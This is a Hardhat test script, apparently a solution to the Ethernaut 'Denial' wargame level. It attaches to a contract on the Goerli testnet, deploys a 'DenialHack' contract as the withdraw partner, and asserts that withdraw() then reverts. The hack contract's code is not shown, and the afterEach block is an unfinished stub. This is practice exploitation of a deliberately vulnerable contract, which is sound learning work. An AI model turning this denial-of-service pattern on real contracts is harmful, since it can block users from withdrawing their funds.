const { expect } = require("chai");
const { ethers } = require("hardhat");
const { api_key, } = require('../secrets.json');

describe("Denial", function () {
	let contract, provider, first_account;
	let target_address = false;

	beforeEach(async function () {
		target_address = "0xcDf2555222CeeA332D4F89c2a2A1829C908911D5";
		[first_account] = await ethers.getSigners();
		if (target_address) {
			contract = await ethers.getContractAt("Denial", target_address);
			provider = new ethers.providers.AlchemyProvider(network="goerli", api_key);
		} else {
			const Denial = await ethers.getContractFactory("Denial");
			contract = await Denial.deploy();
			target_address = contract.address;
			provider = new ethers.providers.getDefaultProvider("http:/\/localhost:8545");
		}
		console.log("Contract address: ", target_address);
	});

	it("Ataque", async function () {
        const DenialHack = await ethers.getContractFactory("DenialHack");
		let hack = await DenialHack.deploy();
        // await hack.deployed();

        let tx = await contract.setWithdrawPartner(hack.address);
        await tx.wait();

        await expect(contract.withdraw()).to.be.reverted;
	});

	afterEach(async function() {
		// COMPLETAR
	});
});
